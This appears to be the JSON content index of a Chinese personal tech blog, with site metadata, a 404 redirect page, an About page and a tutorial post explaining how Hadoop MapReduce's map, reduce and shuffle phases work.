{"meta":{"title":"星空博客","subtitle":null,"description":null,"author":"Wasim","url":"http://www.wangxin123.com"},"pages":[{"title":"404","date":"2015-02-05T12:03:48.000Z","updated":"2017-01-19T06:32:17.484Z","comments":true,"path":"404.html","permalink":"http://www.wangxin123.com/404.html","excerpt":"","keywords":null,"text":"404&#x9875;&#x9762; *{margin:0;padding:0;outline:none;font-family:\\5FAE\\8F6F\\96C5\\9ED1,宋体;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;user-select:none;cursor:default;font-weight:lighter;} .center{margin:0 auto;} .whole{width:100%;height:100%;line-height:100%;position:fixed;bottom:0;left:0;z-index:-1000;overflow:hidden;} .whole img{width:100%;height:100%;} .mask{width:100%;height:100%;position:absolute;top:0;left:0;background:#000;opacity:0.6;filter:alpha(opacity=60);} .b{width:100%;text-align:center;height:400px;position:absolute;top:50%;margin-top:-230px}.a{width:150px;height:50px;margin-top:30px}.a a{display:block;float:left;width:150px;height:50px;background:#fff;text-align:center;line-height:50px;font-size:18px;border-radius:25px;color:#333}.a a:hover{color:#000;box-shadow:#fff 0 0 20px} p{color:#fff;margin-top:40px;font-size:24px;} #num{margin:0 5px;font-weight:bold;} var num=6; function redirect(){ num--; document.getElementById(\"num\").innerHTML=num; if(num","raw":null,"content":null},{"title":"About","date":"2016-04-16T15:42:13.000Z","updated":"2017-02-22T10:50:38.592Z","comments":false,"path":"about/index.html","permalink":"http://www.wangxin123.com/about/index.html","excerpt":"","keywords":null,"text":"&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F; &#x5DE5;&#x4F5C;&#x5730;&#x70B9;&#xFF1A;&#x5927;&#x5929;&#x671D; &#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#xFF1A;&#x6709;&#x5173;&#x90E8;&#x95E8; &#x76EE;&#x524D;&#x5C97;&#x4F4D;&#xFF1A;Web&#x540E;&#x7AEF;&#x653B;&#x57CE;&#x72EE; &#x671F;&#x5F85;&#x5C97;&#x4F4D;&#xFF1A;&#x67B6;&#x6784;&#x5E08;&#xFF08;&#x5148;&#x8D70;&#x5168;&#x6808;&#x5427;&#xFF0C;&#x4E00;&#x4E13;&#x591A;&#x5F3A;&#xFF09; &#x5174;&#x8DA3;&#x7231;&#x597D;&#xFF1A;&#x6298;&#x817E;&#xFF0C;&#x6298;&#x817E;&#xFF0C;&#x518D;&#x4F7F;&#x52B2;&#x6298;&#x817E; &#x8054;&#x7CFB;&#x65B9;&#x5F0F;&#xFF1A;wasim37@163.com&#x3001;wasimV537@gmail.com &#x4E00;&#x4E2A;&#x4EBA;&#x8981;&#x50CF;&#x4E00;&#x652F;&#x961F;&#x4F0D;&#xFF0C;&#x5BF9;&#x7740;&#x81EA;&#x5DF1;&#x7684;&#x5934;&#x8111;&#x548C;&#x5FC3;&#x7075;&#x62DB;&#x5175;&#x4E70;&#x9A6C;&#xFF0C;&#x4E0D;&#x6C14;&#x9981;&#xFF0C;&#x6709;&#x53EC;&#x5524;&#xFF0C;&#x7231;&#x81EA;&#x7531; &#x5982;&#x679C;&#x6587;&#x7AE0;&#x5BF9;&#x4F60;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x8BF7;&#x7528; &#x5FAE;&#x4FE1; &#x626B;&#x4E00;&#x626B;&#x968F;&#x610F;&#x6253;&#x8D4F;","raw":null,"content":null},{"title":"Categories","date":"2016-11-18T06:53:47.941Z","updated":"2016-11-18T06:50:52.257Z","comments":true,"path":"categories/index.html","permalink":"http://www.wangxin123.com/categories/index.html","excerpt":"","keywords":null,"text":"","raw":null,"content":null},{"title":"Tags","date":"2016-11-18T06:53:47.943Z","updated":"2016-11-18T06:50:52.258Z","comments":true,"path":"tags/index.html","permalink":"http://www.wangxin123.com/tags/index.html","excerpt":"","keywords":null,"text":"","raw":null,"content":null}],"posts":[{"title":"MapReduce详解","slug":"MapReduce详解","date":"2017-03-01T13:18:00.000Z","updated":"2017-03-03T03:28:10.590Z","comments":true,"path":"2017/03/01/MapReduce详解/","link":"","permalink":"http://www.wangxin123.com/2017/03/01/MapReduce详解/","excerpt":"MapReduce&#x7B80;&#x4ECB;MapReduce&#x662F;&#x4E00;&#x79CD;&#x7F16;&#x7A0B;&#x6A21;&#x578B;&#xFF0C;&#x7528;&#x4E8E;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x5927;&#x4E8E;1TB&#xFF09;&#x7684;&#x5E76;&#x884C;&#x8FD0;&#x7B97;&#x3002;&#x6982;&#x5FF5;&#x201D;Map&#xFF08;&#x6620;&#x5C04;&#xFF09;&#x201D;&#x548C;&#x201D;Reduce&#xFF08;&#x5F52;&#x7EA6;&#xFF09;&#x201D;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x3002; MapReduce&#x6781;&#x5927;&#x5730;&#x65B9;&#x4FBF;&#x4E86;&#x7F16;&#x7A0B;&#x4EBA;&#x5458;&#x5728;&#x4E0D;&#x4F1A;&#x5206;&#x5E03;&#x5F0F;&#x5E76;&#x884C;&#x7F16;&#x7A0B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E0A;&#x3002; WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x662F;&#x6700;&#x7B80;&#x5355;&#x4E5F;&#x662F;&#x6700;&#x80FD;&#x4F53;&#x73B0;MapReduce&#x601D;&#x60F3;&#x7684;&#x7A0B;&#x5E8F;&#x4E4B;&#x4E00;&#xFF0C;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;MapReduce&#x7248;&#x201D;Hello World&#x201D;&#x3002;&#x8BCD;&#x8BA1;&#x6570;&#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x529F;&#x80FD;&#x662F;&#xFF1A;&#x7EDF;&#x8BA1;&#x4E00;&#x7CFB;&#x5217;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x8BCD;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002; &#x4EE5;&#x4E0B;&#x662F;WordCount&#x8FC7;&#x7A0B;&#x56FE;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x5927;&#x81F4;&#x6D4F;&#x89C8;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x7ED3;&#x5408;&#x4E0B;&#x6587;&#x7684;Mapper&#x548C;Reduce&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;&#x8FDB;&#x884C;&#x7406;&#x89E3;&#x3002;","keywords":null,"text":"MapReduce&#x7B80;&#x4ECB;MapReduce&#x662F;&#x4E00;&#x79CD;&#x7F16;&#x7A0B;&#x6A21;&#x578B;&#xFF0C;&#x7528;&#x4E8E;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x5927;&#x4E8E;1TB&#xFF09;&#x7684;&#x5E76;&#x884C;&#x8FD0;&#x7B97;&#x3002;&#x6982;&#x5FF5;&#x201D;Map&#xFF08;&#x6620;&#x5C04;&#xFF09;&#x201D;&#x548C;&#x201D;Reduce&#xFF08;&#x5F52;&#x7EA6;&#xFF09;&#x201D;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x3002; MapReduce&#x6781;&#x5927;&#x5730;&#x65B9;&#x4FBF;&#x4E86;&#x7F16;&#x7A0B;&#x4EBA;&#x5458;&#x5728;&#x4E0D;&#x4F1A;&#x5206;&#x5E03;&#x5F0F;&#x5E76;&#x884C;&#x7F16;&#x7A0B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E0A;&#x3002; WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x662F;&#x6700;&#x7B80;&#x5355;&#x4E5F;&#x662F;&#x6700;&#x80FD;&#x4F53;&#x73B0;MapReduce&#x601D;&#x60F3;&#x7684;&#x7A0B;&#x5E8F;&#x4E4B;&#x4E00;&#xFF0C;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;MapReduce&#x7248;&#x201D;Hello World&#x201D;&#x3002;&#x8BCD;&#x8BA1;&#x6570;&#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x529F;&#x80FD;&#x662F;&#xFF1A;&#x7EDF;&#x8BA1;&#x4E00;&#x7CFB;&#x5217;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x8BCD;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002; &#x4EE5;&#x4E0B;&#x662F;WordCount&#x8FC7;&#x7A0B;&#x56FE;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x5927;&#x81F4;&#x6D4F;&#x89C8;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x7ED3;&#x5408;&#x4E0B;&#x6587;&#x7684;Mapper&#x548C;Reduce&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;&#x8FDB;&#x884C;&#x7406;&#x89E3;&#x3002; &#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;MapReduce&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;Mapper&#x8FD0;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5904;&#x7406;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x3002;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F5C;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x8F93;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x5230;HDFS&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x5982;&#x56FE;&#xFF1A; Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;&#x6BCF;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;&#xFF0C;&#x5B83;&#x4F1A;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x89E3;&#x6790;&#x6210;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x7ECF;&#x8FC7;&#x6211;&#x4EEC;&#x8986;&#x76D6;&#x7684;map&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x8F6C;&#x6362;&#x4E3A;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x518D;&#x8F93;&#x51FA;&#x3002;&#x6574;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002; &#x5728;&#x4E0A;&#x56FE;&#x4E2D;&#xFF0C;&#x628A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x5206;&#x4E3A;&#x516D;&#x4E2A;&#x9636;&#x6BB5;&#x3002; &#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x6807;&#x51C6;&#x8FDB;&#x884C;&#x5206;&#x7247;(InputSplit)&#xFF0C;&#x6BCF;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x7247;(InputSplit)&#x7684;&#x5927;&#x5C0F;&#x4E0E;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x9ED8;&#x8BA4;&#x503C;64MB&#xFF0C;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;32MB&#xFF0C;&#x4E00;&#x4E2A;&#x662F;72MB&#x3002;&#x90A3;&#x4E48;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F1A;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E24;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;&#x4E00;&#x5171;&#x4EA7;&#x751F;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;&#x6BCF;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7531;&#x4E00;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x3002; &#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x8F93;&#x5165;&#x7247;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6709;&#x4E2A;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x662F;&#x628A;&#x6BCF;&#x4E00;&#x884C;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x201C;&#x952E;&#x201D;&#x662F;&#x6BCF;&#x4E00;&#x884C;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;(&#x5355;&#x4F4D;&#x662F;&#x5B57;&#x8282;)&#xFF0C;&#x201C;&#x503C;&#x201D;&#x662F;&#x672C;&#x884C;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x3002; &#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x8C03;&#x7528;Mapper&#x7C7B;&#x4E2D;&#x7684;map&#x65B9;&#x6CD5;&#x3002;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x89E3;&#x6790;&#x51FA;&#x6765;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x8C03;&#x7528;&#x4E00;&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x5982;&#x679C;&#x6709;1000&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;1000&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x6BCF;&#x4E00;&#x6B21;&#x8C03;&#x7528;map&#x65B9;&#x6CD5;&#x4F1A;&#x8F93;&#x51FA;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002; &#x7B2C;&#x56DB;&#x9636;&#x6BB5;&#x662F;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x5BF9;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x5206;&#x533A;&#x3002;&#x6BD4;&#x8F83;&#x662F;&#x57FA;&#x4E8E;&#x952E;&#x8FDB;&#x884C;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7684;&#x952E;&#x8868;&#x793A;&#x7701;&#x4EFD;(&#x5982;&#x5317;&#x4EAC;&#x3001;&#x4E0A;&#x6D77;&#x3001;&#x5C71;&#x4E1C;&#x7B49;)&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x6309;&#x7167;&#x4E0D;&#x540C;&#x7701;&#x4EFD;&#x8FDB;&#x884C;&#x5206;&#x533A;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;&#x7701;&#x4EFD;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5212;&#x5206;&#x5230;&#x4E00;&#x4E2A;&#x533A;&#x4E2D;&#x3002;&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x533A;&#x3002;&#x5206;&#x533A;&#x7684;&#x6570;&#x91CF;&#x5C31;&#x662F;Reducer&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x91CF;&#x3002;&#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E00;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x3002; &#x7B2C;&#x4E94;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x4E2D;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x9996;&#x5148;&#xFF0C;&#x6309;&#x7167;&#x952E;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x5BF9;&#x4E8E;&#x952E;&#x76F8;&#x540C;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x6309;&#x7167;&#x503C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x6BD4;&#x5982;&#x4E09;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3001;&#x3001;&#xFF0C;&#x952E;&#x548C;&#x503C;&#x5206;&#x522B;&#x662F;&#x6574;&#x6570;&#x3002;&#x90A3;&#x4E48;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x3001;&#x3001;&#x3002;&#x5982;&#x679C;&#x6709;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;&#x8FDB;&#x5165;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linux&#x6587;&#x4EF6;&#x4E2D;&#x3002; &#x7B2C;&#x516D;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;reduce&#x5904;&#x7406;&#x3002;&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x4F1A;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;&#x3002;&#x7ECF;&#x8FC7;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x4F1A;&#x51CF;&#x5C11;&#x3002;&#x5F52;&#x7EA6;&#x540E;&#x7684;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linxu&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x672C;&#x9636;&#x6BB5;&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x81EA;&#x5DF1;&#x589E;&#x52A0;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x4EE3;&#x7801;&#x3002; Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;&#x6BCF;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;&#x3002;Reducer&#x4EFB;&#x52A1;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#x540E;&#x5199;&#x5165;&#x5230;HDFS&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#x3002; &#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x4E3B;&#x52A8;&#x4ECE;Mapper&#x4EFB;&#x52A1;&#x590D;&#x5236;&#x5176;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x3002;Mapper&#x4EFB;&#x52A1;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;Reducer&#x4F1A;&#x590D;&#x5236;&#x591A;&#x4E2A;Mapper&#x7684;&#x8F93;&#x51FA;&#x3002; &#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x590D;&#x5236;&#x5230;Reducer&#x672C;&#x5730;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x90E8;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5373;&#x628A;&#x5206;&#x6563;&#x7684;&#x6570;&#x636E;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x6570;&#x636E;&#x3002;&#x518D;&#x5BF9;&#x5408;&#x5E76;&#x540E;&#x7684;&#x6570;&#x636E;&#x6392;&#x5E8F;&#x3002; &#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;reduce&#x65B9;&#x6CD5;&#x3002;&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x4F1A;&#x4EA7;&#x751F;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6700;&#x540E;&#x628A;&#x8FD9;&#x4E9B;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5199;&#x5165;&#x5230;HDFS&#x6587;&#x4EF6;&#x4E2D;&#x3002; Shuffle&#x2013;MapReduce&#x5FC3;&#x810F;Shuffle&#x8FC7;&#x7A0B;&#x662F;MapReduce&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x4E5F;&#x88AB;&#x79F0;&#x4E3A;&#x5947;&#x8FF9;&#x53D1;&#x751F;&#x7684;&#x5730;&#x65B9;&#x3002; &#x4E0A;&#x9762;&#x8FD9;&#x5F20;&#x56FE;&#x662F;&#x5B98;&#x65B9;&#x5BF9;Shuffle&#x8FC7;&#x7A0B;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x80AF;&#x5B9A;&#x7684;&#x662F;&#xFF0C;&#x5355;&#x4ECE;&#x8FD9;&#x5F20;&#x56FE;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x80FD;&#x660E;&#x767D;Shuffle&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0E;&#x4E8B;&#x5B9E;&#x76F8;&#x5DEE;&#x633A;&#x591A;&#xFF0C;&#x7EC6;&#x8282;&#x4E5F;&#x662F;&#x9519;&#x4E71;&#x7684;&#x3002;Shuffle&#x53EF;&#x4EE5;&#x5927;&#x81F4;&#x7406;&#x89E3;&#x6210;&#x600E;&#x6837;&#x628A;map task&#x7684;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x6709;&#x6548;&#x5730;&#x4F20;&#x9001;&#x5230;reduce&#x7AEF;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x7406;&#x89E3;&#xFF0C; Shuffle&#x63CF;&#x8FF0;&#x7740;&#x6570;&#x636E;&#x4ECE;map task&#x8F93;&#x51FA;&#x5230;reduce task&#x8F93;&#x5165;&#x7684;&#x8FD9;&#x6BB5;&#x8FC7;&#x7A0B;&#x3002; &#x5728;Hadoop&#x8FD9;&#x6837;&#x7684;&#x96C6;&#x7FA4;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5927;&#x90E8;&#x5206;map task&#x4E0E;reduce task&#x7684;&#x6267;&#x884C;&#x662F;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x8282;&#x70B9;&#x4E0A;&#x3002;&#x5F88;&#x591A;&#x65F6;&#x5019;Reduce&#x6267;&#x884C;&#x65F6;&#x9700;&#x8981;&#x8DE8;&#x8282;&#x70B9;&#x53BB;&#x62C9;&#x53D6;&#x5176;&#x5B83;&#x8282;&#x70B9;&#x4E0A;&#x7684;map task&#x7ED3;&#x679C;&#x3010;&#x6CE8;&#x610F;&#xFF1A;Map&#x8F93;&#x51FA;&#x603B;&#x662F;&#x5199;&#x5230;&#x672C;&#x5730;&#x78C1;&#x76D8;&#xFF0C;&#x4F46;&#x662F;Reduce&#x8F93;&#x51FA;&#x4E0D;&#x662F;&#xFF0C;&#x4E00;&#x822C;&#x662F;&#x5199;&#x5230;HDFS&#x3011;&#x3002; &#x5982;&#x679C;&#x96C6;&#x7FA4;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;job&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x90A3;&#x4E48;task&#x7684;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x5BF9;&#x96C6;&#x7FA4;&#x5185;&#x90E8;&#x7684;&#x7F51;&#x7EDC;&#x8D44;&#x6E90;&#x6D88;&#x8017;&#x4F1A;&#x5F88;&#x4E25;&#x91CD;&#x3002;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x6D88;&#x8017;&#x662F;&#x6B63;&#x5E38;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x9650;&#x5236;&#xFF0C;&#x80FD;&#x505A;&#x7684; &#x5C31;&#x662F;&#x6700;&#x5927;&#x5316;&#x5730;&#x51CF;&#x5C11;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x6D88;&#x8017;&#x3002;&#x8FD8;&#x6709;&#x5728;&#x8282;&#x70B9;&#x5185;&#xFF0C;&#x76F8;&#x6BD4;&#x4E8E;&#x5185;&#x5B58;&#xFF0C;&#x78C1;&#x76D8;IO&#x5BF9;job&#x5B8C;&#x6210;&#x65F6;&#x95F4;&#x7684;&#x5F71;&#x54CD;&#x4E5F;&#x662F;&#x53EF;&#x89C2;&#x7684;&#x3002;&#x4ECE;&#x6700;&#x57FA;&#x672C;&#x7684;&#x8981;&#x6C42;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;Shuffle&#x8FC7;&#x7A0B;&#x7684; &#x671F;&#x671B;&#x53EF;&#x4EE5;&#x6709;&#xFF1A; &#x5B8C;&#x6574;&#x5730;&#x4ECE;map task&#x7AEF;&#x62C9;&#x53D6;&#x6570;&#x636E;&#x5230;reduce &#x7AEF;&#x3002; &#x5728;&#x8DE8;&#x8282;&#x70B9;&#x62C9;&#x53D6;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C3D;&#x53EF;&#x80FD;&#x5730;&#x51CF;&#x5C11;&#x5BF9;&#x5E26;&#x5BBD;&#x7684;&#x4E0D;&#x5FC5;&#x8981;&#x6D88;&#x8017;&#x3002; &#x51CF;&#x5C11;&#x78C1;&#x76D8;IO&#x5BF9;task&#x6267;&#x884C;&#x7684;&#x5F71;&#x54CD;&#x3002; 